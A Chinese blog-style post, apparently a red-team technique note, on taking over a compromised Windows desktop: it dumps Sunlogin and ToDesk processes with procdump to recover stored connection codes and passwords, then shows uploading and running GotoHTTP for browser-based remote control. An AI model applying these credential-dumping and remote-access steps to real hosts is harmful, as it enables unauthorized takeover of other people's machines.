---
title: "利用远控软件接管桌面"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# 利用远控软件接管桌面

这也是利用远控软件代替RDP的一种思路

这里记录两种常见的软件的利用：向日葵和todesk

目标主机安装了这类远控软件且为登陆状态，那么可以尝试直接dump软件的进程，然后获取dump文件中存储的连接码和连接密码

### 向日葵

目标主机有向日葵的情况

* 首先获取进程PID

  ~~~cmd
  tasklist | find /I "SunloginClient.exe"
  ~~~

  ![image-20241104170207920](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241104170210120-133368987.png)

* 这里选择非service的进程的PID，然后使用procdump来dump这个进程：

  ~~~cmd
  procdump.exe -accepteula -ma 5384
  ~~~

  ![image-20241104170452653](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241104170455323-1865409112.png)

  这样就得到了一个.dmp文件

* 将该.dmp文件下载，可以使用010去分析这个文件，这里我直接使用0xShe师傅的提取工具一键提取了：

  ![image-20241104170939359](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241104170941435-1215259756.png)

  确实和软件显示的数据一样：

  ![image-20241104171057557](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241104171059409-589374676.png)

### ToDesk

接下来是目标主机有向日葵的情况：

* 依然是先获取PID：

  ~~~cmd
  tasklist | find /I "ToDesk.exe"
  ~~~

  ![image-20241104174856410](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241104174858325-715097373.png)

  找到非service的PID

* 还是一样的dump下来：

  ~~~cmd
  procdump64.exe -accepteula -ma 23964
  ~~~

  ![image-20241104175016418](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241104175019002-34591449.png)

* 下载提取后的.dmp文件，然后使用0xShe师傅的提取工具一键提取即可，唯一不同的是这里定位数据需要配合当前日期：

  ![image-20241104175745185](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241104175747164-763178243.png)

  和目标主机上的数据一样：

  ![image-20241104175826475](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241104175828410-32231448.png)

获取到设备代码和连接密码后，即可直接远控桌面   

### GotoHTTP

有的人问，师傅师傅，有没有更简单的方法，有的兄弟，有的

GotoHTTP的优点一看就很实用：

* 被控端只需要运行一个很小的exe即可
* 控制端不需要客户端应用，在网页[GotoHTTP - 在线远程控制平台](https://gotohttp.com/)输入电脑ID和控制码即可

如此，操作流程也变得非常简单，只要有shell就能实现（需要管理员权限运行）：

* 首先通过temp.sh上传gotohttp.exe：![d863d9ddefd978d299755d7dad3134a1](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/d863d9ddefd978d299755d7dad3134a1.png)

* 然后运行gotohttp.exe即可生成一个带有电脑ID和控制码的配置文件：

  ![64e2f4cca50dffe6bc8d203b8137270c](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/64e2f4cca50dffe6bc8d203b8137270c.png)

* 在网站客户端输入获得的电脑ID和控制码：

![image-20250212012637007](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250212012637007.png)

* 随后即可直接网页端控制（相对而言可能会比todesk更卡）：

![image-20250212012209918](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250212012209918.png)